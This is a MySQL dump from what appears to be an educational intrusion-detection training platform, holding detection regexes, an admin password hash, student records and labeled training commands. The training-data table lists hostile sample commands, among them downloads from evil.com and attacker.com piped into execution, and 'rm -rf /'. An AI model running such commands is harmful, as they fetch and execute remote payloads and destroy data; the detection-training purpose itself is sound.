-- MySQL dump 10.13  Distrib 8.0.42, for Linux (x86_64)
--
-- Host: 127.0.0.1    Database: nids_to_know
-- ------------------------------------------------------
-- Server version	8.0.42-0ubuntu0.24.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `admins`
--

DROP TABLE IF EXISTS `admins`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `admins` (
  `id` int NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `password_hash` text,
  PRIMARY KEY (`id`),
  UNIQUE KEY `email` (`email`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `admins`
--

LOCK TABLES `admins` WRITE;
/*!40000 ALTER TABLE `admins` DISABLE KEYS */;
INSERT INTO `admins` VALUES (1,'NIDSToKnow Admin','nidstoknowadmin@admin.com','scrypt:32768:8:1$R0ReVnsr4r7dtV7P$f6a43b797c2784b0b2e52175b02dbe429557c99c6f16c3e122a7036906ad3da805b6199af17ed6a776c8536c6a085af282e8f059fb88468ed94bfbf8a752f990');
/*!40000 ALTER TABLE `admins` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `anomaly_boost_config`
--

DROP TABLE IF EXISTS `anomaly_boost_config`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `anomaly_boost_config` (
  `id` int NOT NULL AUTO_INCREMENT,
  `config_name` varchar(100) NOT NULL,
  `suspicious_commands_boost` decimal(3,2) DEFAULT '0.20',
  `network_activity_boost` decimal(3,2) DEFAULT '0.15',
  `file_access_boost` decimal(3,2) DEFAULT '0.25',
  `script_execution_boost` decimal(3,2) DEFAULT '0.12',
  `url_patterns_boost` decimal(3,2) DEFAULT '0.10',
  `special_chars_boost` decimal(3,2) DEFAULT '0.08',
  `max_score_cap` decimal(3,2) DEFAULT '0.90',
  `is_active` tinyint(1) DEFAULT '1',
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `config_name` (`config_name`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `anomaly_boost_config`
--

LOCK TABLES `anomaly_boost_config` WRITE;
/*!40000 ALTER TABLE `anomaly_boost_config` DISABLE KEYS */;
INSERT INTO `anomaly_boost_config` VALUES (1,'hybrid_conservative',0.20,0.15,0.25,0.12,0.10,0.08,0.90,1,'2025-07-12 07:47:39'),(2,'standalone_educational',0.30,0.25,0.40,0.20,0.15,0.10,1.00,1,'2025-07-12 07:47:39'),(3,'production_minimal',0.10,0.08,0.12,0.06,0.05,0.03,0.80,1,'2025-07-12 07:47:39');
/*!40000 ALTER TABLE `anomaly_boost_config` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `anomaly_feature_patterns`
--

DROP TABLE IF EXISTS `anomaly_feature_patterns`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `anomaly_feature_patterns` (
  `id` int NOT NULL AUTO_INCREMENT,
  `pattern_name` varchar(100) NOT NULL,
  `pattern_regex` varchar(500) NOT NULL,
  `feature_type` enum('suspicious_commands','network_activity','file_access','script_execution','urls','special_chars') NOT NULL,
  `boost_value` decimal(3,2) NOT NULL,
  `description` text,
  `severity` enum('Low','Medium','High') DEFAULT 'Medium',
  `is_active` tinyint(1) DEFAULT '1',
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=16 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `anomaly_feature_patterns`
--

LOCK TABLES `anomaly_feature_patterns` WRITE;
/*!40000 ALTER TABLE `anomaly_feature_patterns` DISABLE KEYS */;
INSERT INTO `anomaly_feature_patterns` VALUES (1,'dangerous_removal','rm\\s+-rf\\s+','suspicious_commands',0.25,'Dangerous file removal operations','High',1,'2025-07-12 07:47:39'),(2,'network_scanning','nmap\\s+.*','network_activity',0.20,'Network scanning with nmap','High',1,'2025-07-12 07:47:39'),(3,'wget_downloads','wget\\s+.*','network_activity',0.15,'File downloads using wget','Medium',1,'2025-07-12 07:47:39'),(4,'curl_downloads','curl\\s+.*','network_activity',0.15,'File downloads using curl','Medium',1,'2025-07-12 07:47:39'),(5,'sensitive_file_cat','cat\\s+.*\\/etc\\/(passwd|shadow|hosts)','file_access',0.30,'Access to sensitive system files','High',1,'2025-07-12 07:47:39'),(6,'chmod_executable','chmod\\s+\\+x\\s+.*','script_execution',0.18,'Making files executable','Medium',1,'2025-07-12 07:47:39'),(7,'script_execution','\\.\\/.*','script_execution',0.15,'Direct script execution','Medium',1,'2025-07-12 07:47:39'),(8,'python_oneliners','python\\s+-c\\s+.*','script_execution',0.20,'Python one-liner execution','High',1,'2025-07-12 07:47:39'),(9,'bash_oneliners','bash\\s+-c\\s+.*','script_execution',0.20,'Bash one-liner execution','High',1,'2025-07-12 07:47:39'),(10,'http_urls','https?:\\/\\/.*','urls',0.12,'HTTP/HTTPS URLs in commands','Medium',1,'2025-07-12 07:47:39'),(11,'ftp_urls','ftp:\\/\\/.*','urls',0.15,'FTP URLs in commands','Medium',1,'2025-07-12 07:47:39'),(12,'pipe_chains','.*\\|.*\\|.*','special_chars',0.10,'Complex pipe chains','Low',1,'2025-07-12 07:47:39'),(13,'background_processes','.*&\\s*$','special_chars',0.08,'Background process execution','Low',1,'2025-07-12 07:47:39'),(14,'ssh_forwarding','ssh\\s+.*-[LRD]\\s+.*','network_activity',0.18,'SSH port forwarding','High',1,'2025-07-12 07:47:39'),(15,'netcat_listeners','nc\\s+.*-l\\s+.*','network_activity',0.22,'Netcat listeners','High',1,'2025-07-12 07:47:39');
/*!40000 ALTER TABLE `anomaly_feature_patterns` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `assignments`
--

DROP TABLE IF EXISTS `assignments`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `assignments` (
  `id` int NOT NULL AUTO_INCREMENT,
  `instructor_id` int NOT NULL,
  `student_id` int NOT NULL,
  `module_name` varchar(255) NOT NULL,
  `module_slug` varchar(255) DEFAULT NULL,
  `due_date` datetime DEFAULT NULL,
  `status` enum('assigned','in-progress','completed','overdue') DEFAULT 'assigned',
  `notes` text,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `idx_assignments_student` (`student_id`,`created_at`),
  KEY `idx_assignments_instructor` (`instructor_id`,`created_at`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `assignments`
--

LOCK TABLES `assignments` WRITE;
/*!40000 ALTER TABLE `assignments` DISABLE KEYS */;
INSERT INTO `assignments` VALUES (3,2,7,'Signature-Based Detection','signature-based-detection','2025-09-30 23:59:00','overdue','Do this','2025-09-23 10:15:44'),(4,2,13,'Signature-Based Detection','signature-based-detection','2025-10-31 16:23:00','assigned','Do it until October 31','2025-10-05 08:24:10'),(5,2,18,'Signature-Based Detection','signature-based-detection','2025-10-31 13:51:00','assigned',NULL,'2025-10-09 05:51:42'),(6,2,18,'Anomaly-Based Detection','anomaly-based-detection','2025-10-31 23:59:00','assigned','Submit on time.','2025-10-09 06:25:11');
/*!40000 ALTER TABLE `assignments` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `feedback`
--

DROP TABLE IF EXISTS `feedback`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `feedback` (
  `id` int NOT NULL AUTO_INCREMENT,
  `student_id` int DEFAULT NULL,
  `module_name` varchar(255) DEFAULT NULL,
  `message` text,
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP,
  `instructor_id` int DEFAULT NULL,
  `submission_id` int DEFAULT NULL,
  `assignment_id` int DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `feedback`
--

LOCK TABLES `feedback` WRITE;
/*!40000 ALTER TABLE `feedback` DISABLE KEYS */;
INSERT INTO `feedback` VALUES (1,1,NULL,'asdasd','2025-09-15 23:46:01',2,NULL,1);
/*!40000 ALTER TABLE `feedback` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `instructor_profiles`
--

DROP TABLE IF EXISTS `instructor_profiles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `instructor_profiles` (
  `instructor_id` int NOT NULL,
  `join_date` date DEFAULT NULL,
  `avatar_url` varchar(512) DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`instructor_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `instructor_profiles`
--

LOCK TABLES `instructor_profiles` WRITE;
/*!40000 ALTER TABLE `instructor_profiles` DISABLE KEYS */;
INSERT INTO `instructor_profiles` VALUES (2,'2025-10-05','http://localhost:8000/uploads/avatars/instructors/2_0f7f45d77acb43aab16df9223dc6c23c.jpg','2025-10-07 05:22:51');
/*!40000 ALTER TABLE `instructor_profiles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `instructor_settings`
--

DROP TABLE IF EXISTS `instructor_settings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `instructor_settings` (
  `instructor_id` int NOT NULL,
  `notifications_text` longtext,
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`instructor_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `instructor_settings`
--

LOCK TABLES `instructor_settings` WRITE;
/*!40000 ALTER TABLE `instructor_settings` DISABLE KEYS */;
/*!40000 ALTER TABLE `instructor_settings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `isolation_forest_config`
--

DROP TABLE IF EXISTS `isolation_forest_config`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `isolation_forest_config` (
  `id` int NOT NULL AUTO_INCREMENT,
  `model_name` varchar(100) NOT NULL,
  `n_trees` int DEFAULT '100',
  `max_depth` int DEFAULT '8',
  `contamination` decimal(3,2) DEFAULT '0.10',
  `sample_size` int DEFAULT '256',
  `threshold` decimal(3,2) DEFAULT '0.60',
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `is_active` tinyint(1) DEFAULT '1',
  PRIMARY KEY (`id`),
  UNIQUE KEY `model_name` (`model_name`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `isolation_forest_config`
--

LOCK TABLES `isolation_forest_config` WRITE;
/*!40000 ALTER TABLE `isolation_forest_config` DISABLE KEYS */;
INSERT INTO `isolation_forest_config` VALUES (1,'hybrid_detection',100,8,0.10,256,0.60,'2025-07-12 07:47:39','2025-07-12 07:47:39',1),(2,'educational_demo',50,6,0.15,128,0.50,'2025-07-12 07:47:39','2025-07-12 07:47:39',1);
/*!40000 ALTER TABLE `isolation_forest_config` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `isolation_forest_training_data`
--

DROP TABLE IF EXISTS `isolation_forest_training_data`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `isolation_forest_training_data` (
  `id` int NOT NULL AUTO_INCREMENT,
  `command_pattern` varchar(500) NOT NULL,
  `label` enum('normal','anomalous') NOT NULL,
  `command_length` int DEFAULT NULL,
  `arg_count` int DEFAULT NULL,
  `special_chars_count` int DEFAULT NULL,
  `path_separators_count` int DEFAULT NULL,
  `session_context` json DEFAULT NULL,
  `feature_vector` json DEFAULT NULL,
  `description` text,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=25 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `isolation_forest_training_data`
--

LOCK TABLES `isolation_forest_training_data` WRITE;
/*!40000 ALTER TABLE `isolation_forest_training_data` DISABLE KEYS */;
INSERT INTO `isolation_forest_training_data` VALUES (1,'ls','normal',2,0,0,0,NULL,NULL,'Basic directory listing','2025-07-12 07:47:39'),(2,'cd /home/user','normal',13,1,0,2,NULL,NULL,'Directory navigation','2025-07-12 07:47:39'),(3,'cat file.txt','normal',12,1,0,0,NULL,NULL,'Reading normal file','2025-07-12 07:47:39'),(4,'git status','normal',10,1,0,0,NULL,NULL,'Git status check','2025-07-12 07:47:39'),(5,'npm install','normal',11,1,0,0,NULL,NULL,'Package installation','2025-07-12 07:47:39'),(6,'python script.py','normal',16,1,0,0,NULL,NULL,'Normal Python script execution','2025-07-12 07:47:39'),(7,'vim file.js','normal',11,1,0,0,NULL,NULL,'File editing','2025-07-12 07:47:39'),(8,'mkdir project','normal',13,1,0,0,NULL,NULL,'Directory creation','2025-07-12 07:47:39'),(9,'cp file1 file2','normal',14,2,0,0,NULL,NULL,'File copying','2025-07-12 07:47:39'),(10,'mv old new','normal',9,2,0,0,NULL,NULL,'File moving','2025-07-12 07:47:39'),(11,'grep pattern file','normal',17,2,0,0,NULL,NULL,'Pattern searching','2025-07-12 07:47:39'),(12,'find . -name \"*.js\"','normal',18,3,2,1,NULL,NULL,'File searching','2025-07-12 07:47:39'),(13,'rm -rf /','anomalous',8,2,0,1,NULL,NULL,'Dangerous system deletion','2025-07-12 07:47:39'),(14,'wget http://evil.com/malware.sh','anomalous',33,1,4,4,NULL,NULL,'Malicious file download','2025-07-12 07:47:39'),(15,'chmod +x malware','anomalous',15,2,1,0,NULL,NULL,'Making malware executable','2025-07-12 07:47:39'),(16,'nc -l 4444','anomalous',10,2,0,0,NULL,NULL,'Netcat backdoor listener','2025-07-12 07:47:39'),(17,'nmap -sS target','anomalous',14,2,0,0,NULL,NULL,'Stealth port scanning','2025-07-12 07:47:39'),(18,'cat /etc/passwd','anomalous',14,1,0,2,NULL,NULL,'Sensitive file access','2025-07-12 07:47:39'),(19,'sudo su -','anomalous',8,2,0,0,NULL,NULL,'Privilege escalation','2025-07-12 07:47:39'),(20,'python -c \"import os; os.system(\'rm -rf /\')\"','anomalous',45,2,8,1,NULL,NULL,'Python-based system destruction','2025-07-12 07:47:39'),(21,'curl http://attacker.com/payload.py | python','anomalous',45,1,6,4,NULL,NULL,'Remote code execution','2025-07-12 07:47:39'),(22,'ssh user@target -L 8080:localhost:22','anomalous',35,3,2,0,NULL,NULL,'SSH tunneling','2025-07-12 07:47:39'),(23,'./backdoor &','anomalous',12,1,1,1,NULL,NULL,'Background backdoor execution','2025-07-12 07:47:39'),(24,'bash -c \"wget http://evil.com/shell.sh && chmod +x shell.sh && ./shell.sh\"','anomalous',73,2,9,4,NULL,NULL,'Complex malware deployment','2025-07-12 07:47:39');
/*!40000 ALTER TABLE `isolation_forest_training_data` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `module_requests`
--

DROP TABLE IF EXISTS `module_requests`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `module_requests` (
  `id` int NOT NULL AUTO_INCREMENT,
  `instructor_id` int NOT NULL,
  `module_name` varchar(255) NOT NULL,
  `category` varchar(100) NOT NULL,
  `details` text,
  `status` varchar(50) NOT NULL DEFAULT 'pending',
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP,
  `admin_comment` text,
  `decided_at` datetime DEFAULT NULL,
  `content_json` longtext,
  PRIMARY KEY (`id`),
  KEY `idx_instructor` (`instructor_id`),
  KEY `idx_status` (`status`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `module_requests`
--

LOCK TABLES `module_requests` WRITE;
/*!40000 ALTER TABLE `module_requests` DISABLE KEYS */;
INSERT INTO `module_requests` VALUES (1,2,'Signature-Based Detection','edit_module','I want to edit module 1 contents.','rejected','2025-10-01 17:15:34',NULL,'2025-10-01 17:26:49',NULL),(2,2,'Signature-Based Detection','edit_module','I want to edit module 1 contents.','rejected','2025-10-01 17:15:34','adadad','2025-10-01 17:26:55',NULL),(3,2,'Signature-Based Detection','edit_module','I want to edit module 1 contents.','approved','2025-10-01 17:15:34',NULL,'2025-10-01 17:27:01',NULL),(4,2,'Signature-Based Detection','edit_module','I want to edit module 1 contents.','approved','2025-10-01 17:15:34','asdadada','2025-10-01 17:27:06',NULL),(5,2,'Anomaly-Based Detection','change_status','asd','rejected','2025-10-01 17:32:24',NULL,'2025-10-05 15:16:32',NULL),(6,2,'Test','signature-based_nids','Test','approved','2025-10-01 19:05:45',NULL,'2025-10-05 15:17:13',NULL),(7,2,'Test','signature-based_nids','Test','approved','2025-10-01 19:49:19','Approve ko na to','2025-10-05 16:22:26',NULL),(8,2,'Test','signature-based_nids','Test','pending','2025-10-01 19:51:39',NULL,NULL,'{\"meta\": {\"title\": \"Test\", \"description\": \"Test\", \"category\": \"Signature-Based NIDS\", \"difficulty\": \"Beginner\", \"estimatedTime\": \"10–15 mins\", \"visibility\": \"Public\", \"schedule\": \"\", \"status\": \"draft\"}, \"overview\": {\"title\": \"Test\", \"content\": \"Test\"}, \"theory\": [{\"moduleNumber\": 1, \"lessons\": [{\"title\": \"Test\", \"content\": \"Test\"}, {\"title\": \"Test\", \"content\": \"Test\"}], \"assessment\": {\"title\": \"Test\", \"content\": \"Test\"}}, {\"moduleNumber\": 2, \"lessons\": [{\"title\": \"Test\", \"content\": \"Test\"}], \"assessment\": {\"title\": \"Test\", \"content\": \"Test\"}}], \"practical\": {\"title\": \"Test\", \"content\": \"Test\"}, \"assessment\": {\"title\": \"Test\", \"content\": \"Test\"}}'),(9,2,'Test','signature-based_nids','Test','pending','2025-10-01 19:58:41',NULL,NULL,'{\"meta\": {\"title\": \"Test\", \"description\": \"Test\", \"category\": \"Signature-Based NIDS\", \"difficulty\": \"Beginner\", \"estimatedTime\": \"10–15 mins\", \"visibility\": \"Public\", \"schedule\": \"\", \"status\": \"draft\"}, \"overview\": {\"title\": \"Test\", \"content\": \"Test\"}, \"theory\": [{\"moduleNumber\": 1, \"lessons\": [{\"title\": \"Test\", \"content\": \"Test\"}, {\"title\": \"Test\", \"content\": \"Test\"}], \"assessment\": {\"title\": \"Test\", \"content\": \"Test\"}}, {\"moduleNumber\": 2, \"lessons\": [{\"title\": \"Test\", \"content\": \"Test\"}], \"assessment\": {\"title\": \"Test\", \"content\": \"Test\"}}], \"practical\": {\"title\": \"Test\", \"content\": \"Test\"}, \"assessment\": {\"title\": \"Test\", \"content\": \"Test\"}}'),(10,2,'Test','signature-based_nids','Test','approved','2025-10-01 19:58:48',NULL,'2025-10-05 16:20:19','{\"meta\": {\"title\": \"Test\", \"description\": \"Test\", \"category\": \"Signature-Based NIDS\", \"difficulty\": \"Beginner\", \"estimatedTime\": \"10–15 mins\", \"visibility\": \"Public\", \"schedule\": \"\", \"status\": \"draft\"}, \"overview\": {\"title\": \"Test\", \"content\": \"Test\"}, \"theory\": [{\"moduleNumber\": 1, \"lessons\": [{\"title\": \"Test\", \"content\": \"Test\"}, {\"title\": \"Test\", \"content\": \"Test\"}], \"assessment\": {\"title\": \"Test\", \"content\": \"Test\"}}, {\"moduleNumber\": 2, \"lessons\": [{\"title\": \"Test\", \"content\": \"Test\"}], \"assessment\": {\"title\": \"Test\", \"content\": \"Test\"}}], \"practical\": {\"title\": \"Test\", \"content\": \"Test\"}, \"assessment\": {\"title\": \"Test\", \"content\": \"Test\"}}');
/*!40000 ALTER TABLE `module_requests` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `notifications`
--

DROP TABLE IF EXISTS `notifications`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `notifications` (
  `recipient_id` int DEFAULT NULL,
  `recipient_role` varchar(20) DEFAULT NULL,
  `id` int NOT NULL AUTO_INCREMENT,
  `message` varchar(255) NOT NULL,
  `time` datetime DEFAULT CURRENT_TIMESTAMP,
  `type` enum('info','success','warning','error') DEFAULT 'info',
  `read` tinyint(1) DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_time` (`time`),
  KEY `idx_recipient` (`recipient_role`,`recipient_id`)
) ENGINE=InnoDB AUTO_INCREMENT=25 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `notifications`
--

LOCK TABLES `notifications` WRITE;
/*!40000 ALTER TABLE `notifications` DISABLE KEYS */;
INSERT INTO `notifications` VALUES (NULL,NULL,2,'Student completed Signature-Based Detection module','2025-09-09 17:33:00','success',0),(NULL,NULL,3,'Student completed Signature-Based Detection module','2025-09-10 18:18:32','success',0),(NULL,NULL,4,'New student enrolled in Anomaly-Based Detection','2025-09-14 23:14:03','info',0),(NULL,'admin',5,'Test admin notice','2025-10-05 10:58:51','info',1),(NULL,'admin',6,'Instructor signup pending approval: Test Instructor 4 (test.instructor4@lspu.edu.ph)','2025-10-05 15:09:21','warning',0),(NULL,'instructor',7,'Module request \'Anomaly-Based Detection\' rejected','2025-10-05 15:16:32','info',0),(NULL,'instructor',8,'Module request \'Test\' approved','2025-10-05 15:17:13','info',0),(NULL,'instructor',9,'Module request \'Test\' approved','2025-10-05 16:20:19','info',0),(2,'instructor',10,'Module request \'Test\' approved','2025-10-05 16:22:26','success',0),(13,'student',11,'New assignment: Signature-Based Detection due 2025-10-31 16:23:00','2025-10-05 16:24:10','info',0),(NULL,'admin',12,'New student signup: Juan Dela Cruz (juan.delacruz@lspu.edu.ph)','2025-10-08 21:59:15','info',0),(NULL,'admin',13,'New student signup: student 4 (student.4@lspu.edu.ph)','2025-10-09 01:00:59','info',0),(17,'student',14,'Overview completed: signature-based-detection','2025-10-09 07:55:24','success',1),(NULL,'instructor',15,'New student enrolled in Signature-Based Detection','2025-10-09 07:55:38','info',0),(17,'student',16,'Overview completed: signature-based-detection','2025-10-09 07:57:49','success',1),(NULL,'instructor',17,'New student enrolled in Signature-Based Detection','2025-10-09 07:57:51','info',0),(17,'student',18,'Overview completed: signature-based-detection','2025-10-09 07:58:16','success',0),(NULL,'instructor',19,'New student enrolled in Signature-Based Detection','2025-10-09 07:58:18','info',0),(NULL,'admin',20,'New student signup: student 5 (student.5@lspu.edu.ph)','2025-10-09 13:38:11','info',0),(18,'student',21,'Overview completed: signature-based-detection','2025-10-09 13:38:30','success',0),(NULL,'instructor',22,'New student enrolled in Signature-Based Detection','2025-10-09 13:38:31','info',0),(18,'student',23,'New assignment: Signature-Based Detection due 2025-10-31 13:51:00','2025-10-09 13:51:42','info',0),(18,'student',24,'New assignment: Anomaly-Based Detection due 2025-10-31 23:59:00','2025-10-09 14:25:11','info',0);
/*!40000 ALTER TABLE `notifications` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `recent_activity`
--

DROP TABLE IF EXISTS `recent_activity`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `recent_activity` (
  `id` int NOT NULL AUTO_INCREMENT,
  `activity` varchar(255) NOT NULL,
  `time` datetime DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=21 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `recent_activity`
--

LOCK TABLES `recent_activity` WRITE;
/*!40000 ALTER TABLE `recent_activity` DISABLE KEYS */;
INSERT INTO `recent_activity` VALUES (1,'Student 5 passed quiz for m1 (score 4/5)','2025-09-21 19:28:48'),(2,'Student 5 improved quiz score for m1 to 5/5','2025-09-21 19:43:17'),(3,'Student 6 passed quiz for m1 (score 5/5)','2025-09-21 20:12:40'),(4,'Student 6 passed quiz for m2 (score 5/5)','2025-09-21 21:52:44'),(5,'Student 6 passed quiz for m3 (score 5/5)','2025-09-21 22:23:44'),(6,'Student 6 passed quiz for m4 (score 5/5)','2025-09-21 22:24:01'),(7,'Student 6 passed quiz for summary (score 5/5)','2025-09-21 22:24:14'),(8,'Student 7 passed quiz for m1 (score 5/5)','2025-09-22 20:48:23'),(9,'Student 7 passed quiz for m2 (score 4/5)','2025-09-23 11:39:53'),(10,'Student 7 passed quiz for m3 (score 5/5)','2025-09-23 23:24:22'),(11,'Student 8 passed quiz for m1 (score 5/5)','2025-09-24 00:06:48'),(12,'Student 9 passed quiz for m1 (score 5/5)','2025-09-24 00:08:26'),(13,'Student 13 passed quiz for m1 (score 5/5)','2025-09-27 17:33:48'),(14,'Student 13 passed quiz for m2 (score 4/5)','2025-10-08 15:26:21'),(15,'Student 13 passed quiz for m3 (score 5/5)','2025-10-08 15:26:52'),(16,'Student 13 passed quiz for m4 (score 5/5)','2025-10-08 15:27:27'),(17,'Student 13 passed quiz for summary (score 5/5)','2025-10-08 15:27:45'),(18,'Student 17 passed quiz for m1 (score 4/5)','2025-10-09 08:31:47'),(19,'Student 17 passed quiz for m2 (score 4/5)','2025-10-09 13:35:47'),(20,'Student 18 passed quiz for m1 (score 4/5)','2025-10-09 13:39:23');
/*!40000 ALTER TABLE `recent_activity` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `signatures`
--

DROP TABLE IF EXISTS `signatures`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `signatures` (
  `id` int NOT NULL AUTO_INCREMENT,
  `pattern` varchar(255) NOT NULL,
  `description` varchar(255) NOT NULL,
  `type` varchar(64) DEFAULT NULL,
  `regex` tinyint(1) DEFAULT '0',
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=46 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `signatures`
--

LOCK TABLES `signatures` WRITE;
/*!40000 ALTER TABLE `signatures` DISABLE KEYS */;
INSERT INTO `signatures` VALUES (8,'ssh ','SSH connection attempt','SSH',0,'2025-07-12 04:12:08'),(9,'ssh -L','SSH local port forwarding','SSH Port Forwarding',0,'2025-07-12 04:12:08'),(10,'ssh -R','SSH remote port forwarding','SSH Port Forwarding',0,'2025-07-12 04:12:08'),(11,'ssh -D','SSH dynamic port forwarding','SSH Port Forwarding',0,'2025-07-12 04:12:08'),(12,'cat\\s+.*\\/etc\\/passwd','Access to passwd file','File Access',1,'2025-07-12 04:12:08'),(13,'cat\\s+.*\\/etc\\/shadow','Access to shadow file','File Access',1,'2025-07-12 04:12:08'),(14,'cat\\s+.*\\/etc\\/hosts','Access to hosts file','File Access',1,'2025-07-12 04:12:08'),(15,'cat\\s+.*\\/etc\\/hostname','Access to hostname file','File Access',1,'2025-07-12 04:12:08'),(16,'cat\\s+.*\\/etc\\/resolv\\.conf','Access to DNS config','File Access',1,'2025-07-12 